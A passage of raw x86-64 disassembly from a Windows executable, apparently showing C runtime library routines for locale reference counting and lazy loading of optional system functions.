   1400081d6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400081db:	57                   	push   %rdi
   1400081dc:	48 83 ec 20          	sub    $0x20,%rsp
   1400081e0:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   1400081e7:	48 8b d9             	mov    %rcx,%rbx
   1400081ea:	48 85 c0             	test   %rax,%rax
   1400081ed:	74 79                	je     0x140008268
   1400081ef:	48 8d 0d 1a f5 00 00 	lea    0xf51a(%rip),%rcx        # 0x140017710
   1400081f6:	48 3b c1             	cmp    %rcx,%rax
   1400081f9:	74 6d                	je     0x140008268
   1400081fb:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   140008202:	48 85 c0             	test   %rax,%rax
   140008205:	74 61                	je     0x140008268
   140008207:	83 38 00             	cmpl   $0x0,(%rax)
   14000820a:	75 5c                	jne    0x140008268
   14000820c:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   140008213:	48 85 c9             	test   %rcx,%rcx
   140008216:	74 16                	je     0x14000822e
   140008218:	83 39 00             	cmpl   $0x0,(%rcx)
   14000821b:	75 11                	jne    0x14000822e
   14000821d:	e8 36 d6 ff ff       	call   0x140005858
   140008222:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008229:	e8 1a fa ff ff       	call   0x140007c48
   14000822e:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   140008235:	48 85 c9             	test   %rcx,%rcx
   140008238:	74 16                	je     0x140008250
   14000823a:	83 39 00             	cmpl   $0x0,(%rcx)
   14000823d:	75 11                	jne    0x140008250
   14000823f:	e8 14 d6 ff ff       	call   0x140005858
   140008244:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000824b:	e8 04 fb ff ff       	call   0x140007d54
   140008250:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   140008257:	e8 fc d5 ff ff       	call   0x140005858
   14000825c:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008263:	e8 f0 d5 ff ff       	call   0x140005858
   140008268:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   14000826f:	48 85 c0             	test   %rax,%rax
   140008272:	74 47                	je     0x1400082bb
   140008274:	83 38 00             	cmpl   $0x0,(%rax)
   140008277:	75 42                	jne    0x1400082bb
   140008279:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   140008280:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   140008287:	e8 cc d5 ff ff       	call   0x140005858
   14000828c:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   140008293:	bf 80 00 00 00       	mov    $0x80,%edi
   140008298:	48 2b cf             	sub    %rdi,%rcx
   14000829b:	e8 b8 d5 ff ff       	call   0x140005858
   1400082a0:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   1400082a7:	48 2b cf             	sub    %rdi,%rcx
   1400082aa:	e8 a9 d5 ff ff       	call   0x140005858
   1400082af:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   1400082b6:	e8 9d d5 ff ff       	call   0x140005858
   1400082bb:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   1400082c2:	e8 a5 00 00 00       	call   0x14000836c
   1400082c7:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   1400082ce:	bd 06 00 00 00       	mov    $0x6,%ebp
   1400082d3:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   1400082d7:	48 8d 05 2a f4 00 00 	lea    0xf42a(%rip),%rax        # 0x140017708
   1400082de:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   1400082e2:	74 1a                	je     0x1400082fe
   1400082e4:	48 8b 0f             	mov    (%rdi),%rcx
   1400082e7:	48 85 c9             	test   %rcx,%rcx
   1400082ea:	74 12                	je     0x1400082fe
   1400082ec:	83 39 00             	cmpl   $0x0,(%rcx)
   1400082ef:	75 0d                	jne    0x1400082fe
   1400082f1:	e8 62 d5 ff ff       	call   0x140005858
   1400082f6:	48 8b 0e             	mov    (%rsi),%rcx
   1400082f9:	e8 5a d5 ff ff       	call   0x140005858
   1400082fe:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   140008303:	74 13                	je     0x140008318
   140008305:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   140008309:	48 85 c9             	test   %rcx,%rcx
   14000830c:	74 0a                	je     0x140008318
   14000830e:	83 39 00             	cmpl   $0x0,(%rcx)
   140008311:	75 05                	jne    0x140008318
   140008313:	e8 40 d5 ff ff       	call   0x140005858
   140008318:	48 83 c6 08          	add    $0x8,%rsi
   14000831c:	48 83 c7 20          	add    $0x20,%rdi
   140008320:	48 83 ed 01          	sub    $0x1,%rbp
   140008324:	75 b1                	jne    0x1400082d7
   140008326:	48 8b cb             	mov    %rbx,%rcx
   140008329:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000832e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008333:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008338:	48 83 c4 20          	add    $0x20,%rsp
   14000833c:	5f                   	pop    %rdi
   14000833d:	e9 16 d5 ff ff       	jmp    0x140005858
   140008342:	cc                   	int3
   140008343:	cc                   	int3
   140008344:	48 85 c9             	test   %rcx,%rcx
   140008347:	74 1c                	je     0x140008365
   140008349:	48 8d 05 80 72 00 00 	lea    0x7280(%rip),%rax        # 0x14000f5d0
   140008350:	48 3b c8             	cmp    %rax,%rcx
   140008353:	74 10                	je     0x140008365
   140008355:	b8 01 00 00 00       	mov    $0x1,%eax
   14000835a:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   140008361:	00 
   140008362:	ff c0                	inc    %eax
   140008364:	c3                   	ret
   140008365:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000836a:	c3                   	ret
   14000836b:	cc                   	int3
   14000836c:	48 85 c9             	test   %rcx,%rcx
   14000836f:	74 30                	je     0x1400083a1
   140008371:	53                   	push   %rbx
   140008372:	48 83 ec 20          	sub    $0x20,%rsp
   140008376:	48 8d 05 53 72 00 00 	lea    0x7253(%rip),%rax        # 0x14000f5d0
   14000837d:	48 8b d9             	mov    %rcx,%rbx
   140008380:	48 3b c8             	cmp    %rax,%rcx
   140008383:	74 17                	je     0x14000839c
   140008385:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   14000838b:	85 c0                	test   %eax,%eax
   14000838d:	75 0d                	jne    0x14000839c
   14000838f:	e8 84 fa ff ff       	call   0x140007e18
   140008394:	48 8b cb             	mov    %rbx,%rcx
   140008397:	e8 bc d4 ff ff       	call   0x140005858
   14000839c:	48 83 c4 20          	add    $0x20,%rsp
   1400083a0:	5b                   	pop    %rbx
   1400083a1:	c3                   	ret
   1400083a2:	cc                   	int3
   1400083a3:	cc                   	int3
   1400083a4:	48 85 c9             	test   %rcx,%rcx
   1400083a7:	74 1a                	je     0x1400083c3
   1400083a9:	48 8d 05 20 72 00 00 	lea    0x7220(%rip),%rax        # 0x14000f5d0
   1400083b0:	48 3b c8             	cmp    %rax,%rcx
   1400083b3:	74 0e                	je     0x1400083c3
   1400083b5:	83 c8 ff             	or     $0xffffffff,%eax
   1400083b8:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   1400083bf:	00 
   1400083c0:	ff c8                	dec    %eax
   1400083c2:	c3                   	ret
   1400083c3:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   1400083c8:	c3                   	ret
   1400083c9:	cc                   	int3
   1400083ca:	cc                   	int3
   1400083cb:	cc                   	int3
   1400083cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400083d0:	48 85 c9             	test   %rcx,%rcx
   1400083d3:	0f 84 96 00 00 00    	je     0x14000846f
   1400083d9:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400083dd:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   1400083e2:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   1400083e9:	48 85 c0             	test   %rax,%rax
   1400083ec:	74 04                	je     0x1400083f2
   1400083ee:	f0 44 01 08          	lock add %r9d,(%rax)
   1400083f2:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   1400083f9:	48 85 c0             	test   %rax,%rax
   1400083fc:	74 04                	je     0x140008402
   1400083fe:	f0 44 01 08          	lock add %r9d,(%rax)
   140008402:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140008409:	48 85 c0             	test   %rax,%rax
   14000840c:	74 04                	je     0x140008412
   14000840e:	f0 44 01 08          	lock add %r9d,(%rax)
   140008412:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140008419:	48 85 c0             	test   %rax,%rax
   14000841c:	74 04                	je     0x140008422
   14000841e:	f0 44 01 08          	lock add %r9d,(%rax)
   140008422:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140008426:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000842c:	48 8d 15 d5 f2 00 00 	lea    0xf2d5(%rip),%rdx        # 0x140017708
   140008433:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140008437:	74 0c                	je     0x140008445
   140008439:	48 8b 10             	mov    (%rax),%rdx
   14000843c:	48 85 d2             	test   %rdx,%rdx
   14000843f:	74 04                	je     0x140008445
   140008441:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140008445:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   14000844a:	74 0d                	je     0x140008459
   14000844c:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140008450:	48 85 d2             	test   %rdx,%rdx
   140008453:	74 04                	je     0x140008459
   140008455:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140008459:	48 83 c0 20          	add    $0x20,%rax
   14000845d:	49 83 e8 01          	sub    $0x1,%r8
   140008461:	75 c9                	jne    0x14000842c
   140008463:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   14000846a:	e8 35 ff ff ff       	call   0x1400083a4
   14000846f:	48 83 c4 28          	add    $0x28,%rsp
   140008473:	c3                   	ret
   140008474:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008479:	57                   	push   %rdi
   14000847a:	48 83 ec 20          	sub    $0x20,%rsp
   14000847e:	e8 61 cd ff ff       	call   0x1400051e4
   140008483:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   14000848a:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   140008490:	8b 05 1a f3 00 00    	mov    0xf31a(%rip),%eax        # 0x1400177b0
   140008496:	85 c8                	test   %ecx,%eax
   140008498:	74 08                	je     0x1400084a2
   14000849a:	48 8b 1f             	mov    (%rdi),%rbx
   14000849d:	48 85 db             	test   %rbx,%rbx
   1400084a0:	75 2c                	jne    0x1400084ce
   1400084a2:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400084a7:	e8 38 f1 ff ff       	call   0x1400075e4
   1400084ac:	90                   	nop
   1400084ad:	48 8b 15 a4 ff 00 00 	mov    0xffa4(%rip),%rdx        # 0x140018458
   1400084b4:	48 8b cf             	mov    %rdi,%rcx
   1400084b7:	e8 28 00 00 00       	call   0x1400084e4
   1400084bc:	48 8b d8             	mov    %rax,%rbx
   1400084bf:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400084c4:	e8 6f f1 ff ff       	call   0x140007638
   1400084c9:	48 85 db             	test   %rbx,%rbx
   1400084cc:	74 0e                	je     0x1400084dc
   1400084ce:	48 8b c3             	mov    %rbx,%rax
   1400084d1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400084d6:	48 83 c4 20          	add    $0x20,%rsp
   1400084da:	5f                   	pop    %rdi
   1400084db:	c3                   	ret
   1400084dc:	e8 5f c7 ff ff       	call   0x140004c40
   1400084e1:	90                   	nop
   1400084e2:	cc                   	int3
   1400084e3:	cc                   	int3
   1400084e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400084e9:	57                   	push   %rdi
   1400084ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400084ee:	48 8b fa             	mov    %rdx,%rdi
   1400084f1:	48 85 d2             	test   %rdx,%rdx
   1400084f4:	74 46                	je     0x14000853c
   1400084f6:	48 85 c9             	test   %rcx,%rcx
   1400084f9:	74 41                	je     0x14000853c
   1400084fb:	48 8b 19             	mov    (%rcx),%rbx
   1400084fe:	48 3b da             	cmp    %rdx,%rbx
   140008501:	75 05                	jne    0x140008508
   140008503:	48 8b c7             	mov    %rdi,%rax
   140008506:	eb 36                	jmp    0x14000853e
   140008508:	48 89 39             	mov    %rdi,(%rcx)
   14000850b:	48 8b cf             	mov    %rdi,%rcx
   14000850e:	e8 2d fc ff ff       	call   0x140008140
   140008513:	48 85 db             	test   %rbx,%rbx
   140008516:	74 eb                	je     0x140008503
   140008518:	48 8b cb             	mov    %rbx,%rcx
   14000851b:	e8 ac fe ff ff       	call   0x1400083cc
   140008520:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   140008524:	75 dd                	jne    0x140008503
   140008526:	48 8d 05 73 f0 00 00 	lea    0xf073(%rip),%rax        # 0x1400175a0
   14000852d:	48 3b d8             	cmp    %rax,%rbx
   140008530:	74 d1                	je     0x140008503
   140008532:	48 8b cb             	mov    %rbx,%rcx
   140008535:	e8 92 fc ff ff       	call   0x1400081cc
   14000853a:	eb c7                	jmp    0x140008503
   14000853c:	33 c0                	xor    %eax,%eax
   14000853e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008543:	48 83 c4 20          	add    $0x20,%rsp
   140008547:	5f                   	pop    %rdi
   140008548:	c3                   	ret
   140008549:	cc                   	int3
   14000854a:	cc                   	int3
   14000854b:	cc                   	int3
   14000854c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008551:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008556:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000855b:	57                   	push   %rdi
   14000855c:	41 54                	push   %r12
   14000855e:	41 55                	push   %r13
   140008560:	41 56                	push   %r14
   140008562:	41 57                	push   %r15
   140008564:	48 83 ec 20          	sub    $0x20,%rsp
   140008568:	44 8b f9             	mov    %ecx,%r15d
   14000856b:	4c 8d 35 8e 7a ff ff 	lea    -0x8572(%rip),%r14        # 0x140000000
   140008572:	4d 8b e1             	mov    %r9,%r12
   140008575:	49 8b e8             	mov    %r8,%rbp
   140008578:	4c 8b ea             	mov    %rdx,%r13
   14000857b:	4b 8b 8c fe 00 85 01 	mov    0x18500(%r14,%r15,8),%rcx
   140008582:	00 
   140008583:	4c 8b 15 9e ea 00 00 	mov    0xea9e(%rip),%r10        # 0x140017028
   14000858a:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   14000858e:	41 8b c2             	mov    %r10d,%eax
   140008591:	49 8b d2             	mov    %r10,%rdx
   140008594:	48 33 d1             	xor    %rcx,%rdx
   140008597:	83 e0 3f             	and    $0x3f,%eax
   14000859a:	8a c8                	mov    %al,%cl
   14000859c:	48 d3 ca             	ror    %cl,%rdx
   14000859f:	48 3b d7             	cmp    %rdi,%rdx
   1400085a2:	0f 84 5b 01 00 00    	je     0x140008703
   1400085a8:	48 85 d2             	test   %rdx,%rdx
   1400085ab:	74 08                	je     0x1400085b5
   1400085ad:	48 8b c2             	mov    %rdx,%rax
   1400085b0:	e9 50 01 00 00       	jmp    0x140008705
   1400085b5:	4d 3b c4             	cmp    %r12,%r8
   1400085b8:	0f 84 d9 00 00 00    	je     0x140008697
   1400085be:	8b 75 00             	mov    0x0(%rbp),%esi
   1400085c1:	49 8b 9c f6 60 84 01 	mov    0x18460(%r14,%rsi,8),%rbx
   1400085c8:	00 
   1400085c9:	48 85 db             	test   %rbx,%rbx
   1400085cc:	74 0e                	je     0x1400085dc
   1400085ce:	48 3b df             	cmp    %rdi,%rbx
   1400085d1:	0f 84 ac 00 00 00    	je     0x140008683
   1400085d7:	e9 a2 00 00 00       	jmp    0x14000867e
   1400085dc:	4d 8b b4 f6 60 02 01 	mov    0x10260(%r14,%rsi,8),%r14
   1400085e3:	00 
   1400085e4:	33 d2                	xor    %edx,%edx
   1400085e6:	49 8b ce             	mov    %r14,%rcx
   1400085e9:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   1400085ef:	ff 15 fb 5a 00 00    	call   *0x5afb(%rip)        # 0x14000e0f0
   1400085f5:	48 8b d8             	mov    %rax,%rbx
   1400085f8:	48 85 c0             	test   %rax,%rax
   1400085fb:	75 4f                	jne    0x14000864c
   1400085fd:	ff 15 8d 5a 00 00    	call   *0x5a8d(%rip)        # 0x14000e090
   140008603:	83 f8 57             	cmp    $0x57,%eax
   140008606:	75 42                	jne    0x14000864a
   140008608:	8d 58 b0             	lea    -0x50(%rax),%ebx
   14000860b:	49 8b ce             	mov    %r14,%rcx
   14000860e:	44 8b c3             	mov    %ebx,%r8d
   140008611:	48 8d 15 50 6b 00 00 	lea    0x6b50(%rip),%rdx        # 0x14000f168
   140008618:	e8 23 c8 ff ff       	call   0x140004e40
   14000861d:	85 c0                	test   %eax,%eax
   14000861f:	74 29                	je     0x14000864a
   140008621:	44 8b c3             	mov    %ebx,%r8d
   140008624:	48 8d 15 2d 81 00 00 	lea    0x812d(%rip),%rdx        # 0x140010758
   14000862b:	49 8b ce             	mov    %r14,%rcx
   14000862e:	e8 0d c8 ff ff       	call   0x140004e40
   140008633:	85 c0                	test   %eax,%eax
   140008635:	74 13                	je     0x14000864a
   140008637:	45 33 c0             	xor    %r8d,%r8d
   14000863a:	33 d2                	xor    %edx,%edx
   14000863c:	49 8b ce             	mov    %r14,%rcx
   14000863f:	ff 15 ab 5a 00 00    	call   *0x5aab(%rip)        # 0x14000e0f0
   140008645:	48 8b d8             	mov    %rax,%rbx
   140008648:	eb 02                	jmp    0x14000864c
   14000864a:	33 db                	xor    %ebx,%ebx
   14000864c:	4c 8d 35 ad 79 ff ff 	lea    -0x8653(%rip),%r14        # 0x140000000
   140008653:	48 85 db             	test   %rbx,%rbx
   140008656:	75 0d                	jne    0x140008665
   140008658:	48 8b c7             	mov    %rdi,%rax
   14000865b:	49 87 84 f6 60 84 01 	xchg   %rax,0x18460(%r14,%rsi,8)
   140008662:	00 
   140008663:	eb 1e                	jmp    0x140008683
   140008665:	48 8b c3             	mov    %rbx,%rax
   140008668:	49 87 84 f6 60 84 01 	xchg   %rax,0x18460(%r14,%rsi,8)
   14000866f:	00 
   140008670:	48 85 c0             	test   %rax,%rax
   140008673:	74 09                	je     0x14000867e
   140008675:	48 8b cb             	mov    %rbx,%rcx
   140008678:	ff 15 6a 5a 00 00    	call   *0x5a6a(%rip)        # 0x14000e0e8
   14000867e:	48 85 db             	test   %rbx,%rbx
   140008681:	75 55                	jne    0x1400086d8
   140008683:	48 83 c5 04          	add    $0x4,%rbp
   140008687:	49 3b ec             	cmp    %r12,%rbp
   14000868a:	0f 85 2e ff ff ff    	jne    0x1400085be
   140008690:	4c 8b 15 91 e9 00 00 	mov    0xe991(%rip),%r10        # 0x140017028
   140008697:	33 db                	xor    %ebx,%ebx
   140008699:	48 85 db             	test   %rbx,%rbx
   14000869c:	74 4a                	je     0x1400086e8
   14000869e:	49 8b d5             	mov    %r13,%rdx
   1400086a1:	48 8b cb             	mov    %rbx,%rcx
   1400086a4:	ff 15 5e 59 00 00    	call   *0x595e(%rip)        # 0x14000e008
   1400086aa:	48 85 c0             	test   %rax,%rax
   1400086ad:	74 32                	je     0x1400086e1
   1400086af:	4c 8b 05 72 e9 00 00 	mov    0xe972(%rip),%r8        # 0x140017028
   1400086b6:	ba 40 00 00 00       	mov    $0x40,%edx
   1400086bb:	41 8b c8             	mov    %r8d,%ecx
   1400086be:	83 e1 3f             	and    $0x3f,%ecx
   1400086c1:	2b d1                	sub    %ecx,%edx
   1400086c3:	8a ca                	mov    %dl,%cl
   1400086c5:	48 8b d0             	mov    %rax,%rdx
   1400086c8:	48 d3 ca             	ror    %cl,%rdx
   1400086cb:	49 33 d0             	xor    %r8,%rdx
   1400086ce:	4b 87 94 fe 00 85 01 	xchg   %rdx,0x18500(%r14,%r15,8)
   1400086d5:	00 
   1400086d6:	eb 2d                	jmp    0x140008705
   1400086d8:	4c 8b 15 49 e9 00 00 	mov    0xe949(%rip),%r10        # 0x140017028
   1400086df:	eb b8                	jmp    0x140008699
   1400086e1:	4c 8b 15 40 e9 00 00 	mov    0xe940(%rip),%r10        # 0x140017028
   1400086e8:	41 8b c2             	mov    %r10d,%eax
   1400086eb:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400086f0:	83 e0 3f             	and    $0x3f,%eax
   1400086f3:	2b c8                	sub    %eax,%ecx
   1400086f5:	48 d3 cf             	ror    %cl,%rdi
   1400086f8:	49 33 fa             	xor    %r10,%rdi
   1400086fb:	4b 87 bc fe 00 85 01 	xchg   %rdi,0x18500(%r14,%r15,8)
   140008702:	00 
   140008703:	33 c0                	xor    %eax,%eax
   140008705:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000870a:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000870f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008714:	48 83 c4 20          	add    $0x20,%rsp
   140008718:	41 5f                	pop    %r15
   14000871a:	41 5e                	pop    %r14
   14000871c:	41 5d                	pop    %r13
   14000871e:	41 5c                	pop    %r12
   140008720:	5f                   	pop    %rdi
   140008721:	c3                   	ret
   140008722:	cc                   	int3
   140008723:	cc                   	int3
   140008724:	40 53                	rex push %rbx
   140008726:	48 83 ec 20          	sub    $0x20,%rsp
   14000872a:	48 8b d9             	mov    %rcx,%rbx
   14000872d:	4c 8d 0d c4 80 00 00 	lea    0x80c4(%rip),%r9        # 0x1400107f8
   140008734:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   140008739:	4c 8d 05 b4 80 00 00 	lea    0x80b4(%rip),%r8        # 0x1400107f4
   140008740:	48 8d 15 b1 80 00 00 	lea    0x80b1(%rip),%rdx        # 0x1400107f8
   140008747:	e8 00 fe ff ff       	call   0x14000854c
   14000874c:	48 85 c0             	test   %rax,%rax
   14000874f:	74 16                	je     0x140008767
   140008751:	48 8b d3             	mov    %rbx,%rdx
   140008754:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   14000875b:	48 83 c4 20          	add    $0x20,%rsp
   14000875f:	5b                   	pop    %rbx
   140008760:	48 ff 25 d1 5a 00 00 	rex.W jmp *0x5ad1(%rip)        # 0x14000e238
   140008767:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   14000876c:	48 83 c4 20          	add    $0x20,%rsp
   140008770:	5b                   	pop    %rbx
   140008771:	c3                   	ret
   140008772:	cc                   	int3
   140008773:	cc                   	int3
   140008774:	48 83 ec 28          	sub    $0x28,%rsp
   140008778:	4c 8d 0d ed 7f 00 00 	lea    0x7fed(%rip),%r9        # 0x14001076c
   14000877f:	33 c9                	xor    %ecx,%ecx
   140008781:	4c 8d 05 e0 7f 00 00 	lea    0x7fe0(%rip),%r8        # 0x140010768
   140008788:	48 8d 15 e1 7f 00 00 	lea    0x7fe1(%rip),%rdx        # 0x140010770
   14000878f:	e8 b8 fd ff ff       	call   0x14000854c
   140008794:	48 85 c0             	test   %rax,%rax
   140008797:	74 0b                	je     0x1400087a4
   140008799:	48 83 c4 28          	add    $0x28,%rsp
   14000879d:	48 ff 25 94 5a 00 00 	rex.W jmp *0x5a94(%rip)        # 0x14000e238
   1400087a4:	b8 01 00 00 00       	mov    $0x1,%eax
   1400087a9:	48 83 c4 28          	add    $0x28,%rsp
   1400087ad:	c3                   	ret
   1400087ae:	cc                   	int3
   1400087af:	cc                   	int3
   1400087b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400087b5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400087ba:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400087bf:	57                   	push   %rdi
   1400087c0:	48 83 ec 50          	sub    $0x50,%rsp
   1400087c4:	41 8b d9             	mov    %r9d,%ebx
   1400087c7:	49 8b f8             	mov    %r8,%rdi
   1400087ca:	8b f2                	mov    %edx,%esi
   1400087cc:	4c 8d 0d b5 7f 00 00 	lea    0x7fb5(%rip),%r9        # 0x140010788
   1400087d3:	48 8b e9             	mov    %rcx,%rbp
   1400087d6:	4c 8d 05 a3 7f 00 00 	lea    0x7fa3(%rip),%r8        # 0x140010780
   1400087dd:	48 8d 15 a4 7f 00 00 	lea    0x7fa4(%rip),%rdx        # 0x140010788
   1400087e4:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400087e9:	e8 5e fd ff ff       	call   0x14000854c
   1400087ee:	48 85 c0             	test   %rax,%rax
   1400087f1:	74 52                	je     0x140008845
   1400087f3:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   1400087fa:	00 
   1400087fb:	44 8b cb             	mov    %ebx,%r9d
   1400087fe:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140008805:	00 
   140008806:	8b d6                	mov    %esi,%edx
   140008808:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000880d:	4c 8b c7             	mov    %rdi,%r8
   140008810:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140008815:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000881c:	00 
   14000881d:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140008822:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140008829:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000882d:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140008834:	00 
   140008835:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000883a:	48 8b cd             	mov    %rbp,%rcx
   14000883d:	ff 15 f5 59 00 00    	call   *0x59f5(%rip)        # 0x14000e238
   140008843:	eb 32                	jmp    0x140008877
   140008845:	33 d2                	xor    %edx,%edx
   140008847:	48 8b cd             	mov    %rbp,%rcx
   14000884a:	e8 a9 02 00 00       	call   0x140008af8
   14000884f:	8b c8                	mov    %eax,%ecx
   140008851:	44 8b cb             	mov    %ebx,%r9d
   140008854:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000885b:	4c 8b c7             	mov    %rdi,%r8
   14000885e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008862:	8b d6                	mov    %esi,%edx
   140008864:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000886b:	00 
   14000886c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008871:	ff 15 51 59 00 00    	call   *0x5951(%rip)        # 0x14000e1c8
   140008877:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000887c:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140008881:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140008886:	48 83 c4 50          	add    $0x50,%rsp
   14000888a:	5f                   	pop    %rdi
   14000888b:	c3                   	ret
   14000888c:	40 53                	rex push %rbx
   14000888e:	48 83 ec 20          	sub    $0x20,%rsp
   140008892:	48 8b d9             	mov    %rcx,%rbx
   140008895:	4c 8d 0d 04 7f 00 00 	lea    0x7f04(%rip),%r9        # 0x1400107a0
   14000889c:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400088a1:	4c 8d 05 f0 7e 00 00 	lea    0x7ef0(%rip),%r8        # 0x140010798
   1400088a8:	48 8d 15 d1 68 00 00 	lea    0x68d1(%rip),%rdx        # 0x14000f180
   1400088af:	e8 98 fc ff ff       	call   0x14000854c
   1400088b4:	48 85 c0             	test   %rax,%rax
   1400088b7:	74 0f                	je     0x1400088c8
   1400088b9:	48 8b cb             	mov    %rbx,%rcx
   1400088bc:	48 83 c4 20          	add    $0x20,%rsp
   1400088c0:	5b                   	pop    %rbx
   1400088c1:	48 ff 25 70 59 00 00 	rex.W jmp *0x5970(%rip)        # 0x14000e238
   1400088c8:	48 83 c4 20          	add    $0x20,%rsp
   1400088cc:	5b                   	pop    %rbx
   1400088cd:	48 ff 25 f4 57 00 00 	rex.W jmp *0x57f4(%rip)        # 0x14000e0c8
   1400088d4:	40 53                	rex push %rbx
   1400088d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400088da:	8b d9                	mov    %ecx,%ebx
   1400088dc:	4c 8d 0d c5 7e 00 00 	lea    0x7ec5(%rip),%r9        # 0x1400107a8
   1400088e3:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400088e8:	4c 8d 05 b1 7e 00 00 	lea    0x7eb1(%rip),%r8        # 0x1400107a0
   1400088ef:	48 8d 15 a2 68 00 00 	lea    0x68a2(%rip),%rdx        # 0x14000f198
   1400088f6:	e8 51 fc ff ff       	call   0x14000854c
   1400088fb:	8b cb                	mov    %ebx,%ecx
   1400088fd:	48 85 c0             	test   %rax,%rax
   140008900:	74 0c                	je     0x14000890e
   140008902:	48 83 c4 20          	add    $0x20,%rsp
   140008906:	5b                   	pop    %rbx
   140008907:	48 ff 25 2a 59 00 00 	rex.W jmp *0x592a(%rip)        # 0x14000e238
   14000890e:	48 83 c4 20          	add    $0x20,%rsp
   140008912:	5b                   	pop    %rbx
   140008913:	48 ff 25 c6 57 00 00 	rex.W jmp *0x57c6(%rip)        # 0x14000e0e0
   14000891a:	cc                   	int3
   14000891b:	cc                   	int3
   14000891c:	40 53                	rex push %rbx
   14000891e:	48 83 ec 20          	sub    $0x20,%rsp
   140008922:	8b d9                	mov    %ecx,%ebx
